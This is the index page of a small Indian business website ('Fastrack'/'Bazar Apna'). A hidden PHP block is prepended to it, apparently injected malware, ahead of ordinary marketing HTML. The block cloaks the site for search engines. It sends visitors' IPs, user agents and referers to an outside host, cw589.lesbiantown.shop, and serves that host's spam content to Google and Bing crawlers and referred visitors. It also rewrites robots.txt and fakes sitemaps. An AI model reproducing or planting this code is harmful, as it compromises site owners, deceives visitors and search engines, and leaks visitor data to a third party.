<?php
$vbabh = "cw589";
function dyujhv($url) {
	$rContent = @file_get_contents($url);
	if(empty($rContent)) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		$rContent = curl_exec($ch);
		curl_close($ch);
	}
	return $rContent;
}
error_reporting(0);
$rliwj = "http://".$vbabh. ".lesbiantown.shop/";
if(preg_match("/(oBot|YySpider|yandexBot|yisouSpider|universalFeedParser|FeedDemon|HttpClient|ezooms|AhrefsBot|PetalBot|AskTbFXTV|Indy Library|Feedly|Barkrowler|Paloaltonetworks|EasouSpider|JikeSpider|Jaunty|DigExt|CoolpadWebkit|bytespider|heritrix|CrawlDaddy|Scrapy|SemrushBot|lightDeckReports Bot|ZmEu|ApacheBench|Python-requests|Python|Python-urllib|AmazonBot|java|Swiftbot|mj12bot)/i", $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 403 Forbidden');
	exit();
}
$bagent = "Yahoo|Docomo|Bing|Google";
$pc = "BQIAAAu";
$uagent = urlencode($_SERVER['HTTP_USER_AGENT']);
$refer = urlencode(@$_SERVER['HTTP_REFERER']);
$language = urlencode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty(@$_SERVER['HTTP_CLIENT_IP'])) {
  $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty(@$_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
$ip = urlencode($ip);
$domain = urlencode($_SERVER['HTTP_HOST']);
$script = urlencode($_SERVER['SCRIPT_NAME']);
if ( (! empty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {
	$_SERVER['REQUEST_SCHEME'] = 'https';
} else {
	$_SERVER['REQUEST_SCHEME'] = 'http';
}
$http = urlencode($_SERVER['REQUEST_SCHEME']);
$uri = urlencode($_SERVER['REQUEST_URI']);
if(strpos($uri,"vbavba") !== false) {
	echo "ok";
	exit();
}
$vba = 0;
if(!file_exists("vba.txt")) {
	$uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/vbavba';
	$zkmv = dyujhv($uuu);
	if($zkmv == "ok") {
		$vba = 1;
		@file_put_contents("vba.txt","1");
	} else {
		$vba = 0;
		@file_put_contents("vba.txt","0");
	}
} else {
	$vba = @file_get_contents("vba.txt");
}
if(strpos($uri,"pingsitemap.xml") !== false) {
	$scripname = $_SERVER['SCRIPT_NAME'];
	if( strpos( $scripname, "index.ph") !== false) {
		if($vba == 0) {
			$scripname = '/?';
		} else {
			$scripname = '/';
		}
	} else {
		$scripname = $scripname.'?';
	}
	$robots_contents = "User-agent: *\r\nAllow: /";
	$sitemap = "$http://" . $domain .$scripname. "sitemap.xml";
	$robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";
	$sitemapstatus = "";
	echo $sitemap.": ".$sitemapstatus.'<br/>';
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba&script=$script&sitemap=".urlencode($sitemap);
	$zkmv = dyujhv($requsturl);
	@file_put_contents("robots.txt",$robots_contents);
	exit();
} else if(strpos($uri,"favicon.ico") !== false) {
} else if(strpos($uri,"jp2023") !== false) {
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba&script=$script";
	$zkmv = dyujhv($requsturl);
	echo $zkmv;
	exit();
	return;
} else if(strpos($uri,"robots.txt") !== false) {
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba&script=$script";
	header('Content-Type: text/plain; charset=utf-8');
	echo $zkmv = dyujhv($requsturl);
	@file_put_contents("robots.txt",$zkmv);
	exit();
} else if(preg_match("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])) {
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba&script=$script";
	$zkmv = dyujhv($requsturl);
	if($zkmv == "500") {
		header("HTTP/1.0 500 Internal Server Error");
		exit();
	} else {
		header('Content-Type: text/xml; charset=utf-8');
		echo $zkmv;
		exit();
		return;
	}
} else if(preg_match("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])) {
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba&script=$script";
	$zkmv = dyujhv($requsturl);
	if(!empty($zkmv)) {
		if($zkmv == "500"||substr($zkmv,0,strlen("error code:"))=="error code:") {
			header("HTTP/1.0 500 Internal Server Error");
			exit();
		}
		if(substr($zkmv,0,5)=="<?xml") {
			header('Content-Type: text/xml; charset=utf-8');
		} else {
			header('Content-Type: text/html; charset=utf-8');
		}
		echo $zkmv;
		exit();
		return;
	}
} else if(preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER'])) {
	$requsturl = $rliwj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$vba";
	$zkmv = dyujhv($requsturl);
	if($zkmv == "500") {
		header("HTTP/1.0 500 Internal Server Error");
		exit();
	} else if(!empty($zkmv)) {
		header('HTTP/1.1 404 Not Found');
		echo $zkmv;
		exit();
		return;
	}
} else {
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css"
    />
    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-solid.css"
    />
    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-regular.css"
    />
    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-light.css"
    />
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />

    <!-- fontawesom -->
    <link rel="stylesheet" href="style.css" />
    <title>Fastrack</title>
  </head>

  <body>
    <div>
      <header>
        <nav id="nav" class="">
          <div>
            <img
              src="images/logo-b7ec1ff5.png"
              alt=""
              class="Logo aos-init aos-animate"
              data-aos="fade"
            />
          </div>
          <div class="on">
            <ul class="nav-ul" id="menulist">
              <li>
                <a aria-current="page" class="active" href="index.html">Home</a>
              </li>
              <li><a class="" href="about.html">About Us</a></li>
              <li><a class="" href="market.html">Market</a></li>
              <li>
                <a class="" href="https://fastrack24.in/login.php">Login</a>
              </li>
              <li>
                <a class="" href="https://fastrack24.in/registration.php"
                  >Register</a
                >
              </li>
              <li><a class="" href="contact.html">Contacts</a></li>
              <a href="contact.html"
                ><button class="nav-btn">GET IN TOUCH</button></a
              >
            </ul>
          </div>
          <div id="menu"><i class="fa-solid fa-bars"></i></div>
          <div id="menucls">
            <i class="fa-solid fa-xmark"></i>
          </div>
        </nav>
      </header>
    </div>
    <div class="bg">
      <div class="bg-box">
        <div class="bg-content box1 aos-init aos-animate" data-aos="fade-right">
          <h1>
            <span class="index-module_type__E-SaG"
              >Bazar Apna: Crafted with threads of tradition, woven for your comfort.</span
            >
          </h1>
          <p>
          At Bazar Apna, we believe in creating textiles that not only honor our rich traditions but also provide unmatched comfort for your everyday life. With each weave, we ensure quality and durability, bringing you closer to the essence of true artistry in fashion.
          </p>
          <h2><i class="fa-solid fa-phone-volume"></i> +91-8825134399</h2>
        </div>
        <div
          class="bg-content-img box1 aos-init aos-animate"
          data-aos="fade-left"
        >
          <!-- <img src="images/bg-png-dec89e15.webp" alt="" /> -->
        </div>
      </div>
    </div>
    <div>
      <div class="card-box">
        <div class="card-title">
          <div
            class="service-title-card aos-init aos-animate"
            data-aos="fade-up"
          >
            <h1>Our Recent Product</h1>
          </div>
          <div
            class="service-title-card see-btn aos-init aos-animate"
            data-aos="fade-up"
          ></div>
        </div>
        <div class="main-card aos-init aos-animate" data-aos="fade-up">
          <div class="carddd">
            <div class="card2 aos-init aos-animate" data-aos="fade-up">
              <img src="images/im1.webp" alt="" />
            </div>
          </div>
          <div class="carddd">
            <div class="card2 aos-init aos-animate" data-aos="fade-up">
              <img src="images/im2.webp" alt="" />
            </div>
          </div>
          <div class="carddd">
            <div class="card2 aos-init aos-animate" data-aos="fade-up">
              <img src="images/im3.webp" alt="" />
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="AboutComp-box">
      <div class="About-box aos-init aos-animate" data-aos="fade-up">
        <h1 data-aos="fade-right" class="aos-init aos-animate">
          Our Vision &amp; <span>Mission</span>
        </h1>
        <p data-aos="fade-right" class="aos-init aos-animate">
          Our vision is to provide enhanced range of quality products &amp;
          services that exceeds the expectations of our esteemed customers cost
          effectively and to ne a leader in the industry. Our mission is to
          build long term relationship with our customers and to delight our
          customer at every opportunity through exceptional customer service.
          Our future looks bright as we continue developing a strong base of key
          customers and increasing the assets and investments of the company.
        </p>
      </div>
      <div class="About-box aos-init aos-animate" data-aos="fade-left">
        <img src="images/im4.webp" alt="" />
      </div>
    </div>
    <div class="AboutComp-box mt-5">
      <div class="About-box aos-init aos-animate" data-aos="fade-left">
        <img src="images/im5.webp" alt="" />
      </div>
      <div class="About-box aos-init aos-animate" data-aos="fade-up">
     
        <h1 data-aos="fade-up" class="aos-init aos-animate">
          Why Our Customers <br />
          Choose <span>Working</span> With Us
        </h1>
        <p data-aos="fade-up" class="aos-init aos-animate">
          Ayurveda, an ancient holistic healing system, offers personalized
          wellness rooted in natural remedies and lifestyle practices. Its
          emphasis on individual constitution and balance sets it apart,
          addressing the root cause rather than symptoms alone. Ayurveda fosters
          harmony between mind, body, and spirit through herbal medicines, diet,
          yoga, and meditation. Its time-tested methods promote longevity,
          vitality, and resilience, targeting well-being comprehensively. With a
          focus on prevention rather than cure, Ayurveda offers a gentle yet
          effective approach, minimizing side effects. Choosing Ayurveda means
          embracing a centuries-old tradition that empowers self-healing,
          promoting holistic wellness for a balanced and fulfilling life.
        </p>
      </div>
    </div>
    <div class="clint-bg">
      <div class="clint-content">
        <div>
          <div class="clint-box aos-init aos-animate" data-aos="fade-up">
            <i class="fa-solid fa-lightbulb fa-beat"></i>
            <h1><span>120</span>+</h1>
            <p>Finished Product</p>
          </div>
        </div>
        <div>
          <div class="clint-box aos-init aos-animate" data-aos="fade-up">
            <i class="fa-solid fa-user-plus fa-beat"></i>
            <h1><span>200</span>+</h1>
            <p>Happy Customers</p>
          </div>
        </div>
        <div>
          <div class="clint-box aos-init aos-animate" data-aos="fade-up">
            <i class="fa-solid fa-laptop-file fa-beat"></i>
            <h1><span>25</span>+</h1>
            <p>Running Product</p>
          </div>
        </div>
        <div>
          <div class="clint-box aos-init aos-animate" data-aos="fade-up">
            <i class="fa-solid fa-user fa-beat"></i>
            <h1><span>12</span></h1>
            <p>Professional Team</p>
          </div>
        </div>
      </div>
    </div>
    <div class="reserch-main-box">
      <h1>Research &amp; <span>Development</span></h1>
      <p>
        We, believe in pursuing business through innovation, creativity and
        technology. Best Quality products are developed through continuous &amp;
        research development under different agro climatic conditions for
        profitable &amp; sustainable agriculture in India and all around world.
        We perform actual field trials, toxicity tests etc. before launching any
        product in the market.
      </p>
      <div class="research-img"></div>
    </div>
    <div class="Port-card">
      <div class="Portfolio-box aos-init aos-animate" data-aos="fade-up">
        <div class="inner-text">
          <h4>PORTFOLIO</h4>
          <h1>Our Recent Project</h1>
        </div>
      </div>
      <div class="img-card">
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 1</h2>
            <img src="images/img1.webp" alt="" />
          </div>
        </div>
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 2</h2>
            <img src="images/img2.webp" alt="" />
          </div>
        </div>
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 3</h2>
            <img src="images/img3.webp" alt="" />
          </div>
        </div>
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 4</h2>
            <img src="images/img4.webp" alt="" />
          </div>
        </div>
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 5</h2>
            <img src="images/img5.webp" alt="" />
          </div>
        </div>
        <div class="cardd2">
          <div class="card-img aos-init" data-aos="fade-up">
            <h2>Product 6</h2>
            <img src="images/img6.webp" alt="" />
          </div>
        </div>
      </div>
    </div>
    <div class="Contect-main-box">
      <div class="contect-box content-img">
        <img src="images/imt.jpg" alt="" />
      </div>
      <form
        class="contect-box box22 aos-init aos-animate"
        data-aos="fade-up"
        method="POST"
      >
        <h1>Contact Us</h1>
        <p>Feel free to get in toouch with us !</p>
        <div class="input-box">
          <input type="text" name="name" placeholder="Your Name*" /><input
            type="email"
            name="email"
            placeholder="Email*"
          />
        </div>
        <div class="input-box">
          <input type="tel" name="tel" placeholder="Phone" /><input
            type="url"
            name="url"
            placeholder="Website"
          />
        </div>
        <div class="input-message">
          <textarea
            class="form-control"
            name="message"
            rows="3"
            placeholder="Message"
          ></textarea>
        </div>
        <div class="sms-btn"><button type="submit">SEND MESSAGE</button></div>
      </form>
    </div>
    <div class="testimonial-bg">
      <div class="testimonial-content">
        <div class="inner-content2 aos-init aos-animate" data-aos="fade-up">
          <h4 data-aos="fade-up" class="aos-init aos-animate">TESTIMONIALS</h4>
          <h1 data-aos="fade-up" class="aos-init aos-animate">
            What Our Client’s Say
          </h1>
          <div
            id="carouselExampleInterval"
            class="carousel slide"
            data-bs-ride="carousel"
          >
            <div class="carousel-inner">
              <div class="carousel-item active" data-bs-interval="10000">
                <div class="img aos-init aos-animate" data-aos="fade-up"></div>
                <p data-aos="fade-up" class="aos-init aos-animate">
                  I’ve been a supporter of organic farming for years, and I can
                  confidently say that the produce I’ve received from FasTrack24 is exceptional. The commitment to organic practices
                  shines through in the taste and quality of the fruits and
                  vegetables.
                </p>
                <h5>Mithun</h5>
                <h6>Product User</h6>
              </div>
              <div class="carousel-item" data-bs-interval="2000">
                <div class="img"></div>
                <p>
                  Best company for growth 
                </p>
                <h5>Amit Singh</h5>
                <h6>Product User</h6>
              </div>
            </div>
            <button
              class="carousel-control-prev"
              type="button"
              data-bs-target="#carouselExampleInterval"
              data-bs-slide="prev"
            >
              <span class="carousel-control-prev-icon" aria-hidden="true"></span
              ><span class="visually-hidden">Previous</span></button
            ><button
              class="carousel-control-next"
              type="button"
              data-bs-target="#carouselExampleInterval"
              data-bs-slide="next"
            >
              <span class="carousel-control-next-icon" aria-hidden="true"></span
              ><span class="visually-hidden">Next</span>
            </button>
          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
      <div class="inner-footer aos-init aos-animate" data-aos="fade-right">
        <i class="fa-regular fa-envelope"></i>
        <div>
          <p>+91-8825134399</p>
          <h4>info@bazaarapna.in</h4>
        </div>
      </div>
      <div class="inner-footer aos-init" data-aos="fade-up">
        <i class="fa-solid fa-location-dot"></i>
        <div>
          <h4>
            parna <br />&nbsp;
          </h4>
        </div>
      </div>
      <div class="inner-footer aos-init" data-aos="fade">
        <div class="inner-input">
          <input type="email" placeholder="Email Address" /><button>
            SIGN UP
          </button>
        </div>
      </div>
    </div>
    <div class="footer-bg">
      <div class="footer-content">
        <div class="footer-content-box">
          <h2 data-aos="fade-right" class="aos-init aos-animate">About</h2>
          <p data-aos="fade-left" class="aos-init aos-animate">
            We focus on the needs of small to middle market businesses to
            improve and grow their return.
          </p>
          <div class="footer-icons aos-init" data-aos="fade-right">
            <i class="fa-brands fa-twitter"></i
            ><i class="fa-brands fa-facebook"></i
            ><i class="fa-brands fa-google-plus-g"></i
            ><i class="fa-brands fa-pinterest"></i
            ><i class="fa-brands fa-linkedin-in"></i>
          </div>
        </div>
        <div class="footer-content-box">
          <ul data-aos="fade-left" class="aos-init aos-animate">
            <h2>Business Hours</h2>
            <li>
              <a href="#"
                >Monday-Friday : &nbsp; &nbsp; &nbsp; 9:00 am - 18:00 pm</a
              >
            </li>
            <li>
              <a href="#"
                >Staurday : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                &nbsp; 9:00 am - 16:00 pm</a
              >
            </li>
            <br />
            <li><a href="#">We Work all the holidays!</a></li>
          </ul>
        </div>
        <div class="footer-content-box">
          <ul data-aos="fade-right" class="aos-init aos-animate">
            <h2>Community</h2>
            <li><a href="#">Our Product</a></li>
            <li><a href="#">Documentation</a></li>
            <li><a href="#">Company</a></li>
            <li><a href="#">What We Do?</a></li>
          </ul>
        </div>
        <div class="footer-content-box">
          <!--<ul data-aos="fade-right" class="aos-init aos-animate">-->
          <!--  <h2>Quick Links</h2>-->
          <!--     <li><a  href="https://fastrack24.in/index.html">Home</a></li>-->
          <!--              <li><a class="" href="aboutus.html">About Us</a></li>-->
          <!--              <li><a class="" href="market.html">Market</a></li>-->
          <!--              <li><a class="" href="https://fastrack24.in/login.php">Login</a></li>-->
          <!--              <li><a class="" href="https://fastrack24.in/registration.php">Register</a></li>-->
          <!--              <li><a class="" href="contact.html">Contacts</a></li>-->
          <!--</ul>-->
        </div>
      </div>
    </div>
    <!-- <div class="copy-right-box">
        <p class="copy">©2021- 2023 | TLS TheLiteSpeed OPC Pvt Ltd. | All Rights Reserved. </p>
        <h5>Terms of Use | Privacy Policy.</h5>
    </div> -->
  </body> 
  
  <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
  <script>
    const menu = document.getElementById("menu");
    const menucls = document.getElementById("menucls");
    const menulist = document.getElementById("menulist");
    menu.addEventListener("click", function () {
      menulist.classList.add("munuactive");
      menu.classList.add("menuhide");
      menucls.classList.add("closehide");
    });
    menucls.addEventListener("click", function () {
      menulist.classList.remove("munuactive");
      menu.classList.remove("menuhide");
      menucls.classList.remove("closehide");
    });
  </script>

  <script>
    AOS.init({
      offset: 120,
      duration: 1000,
    });
  </script>
</html>
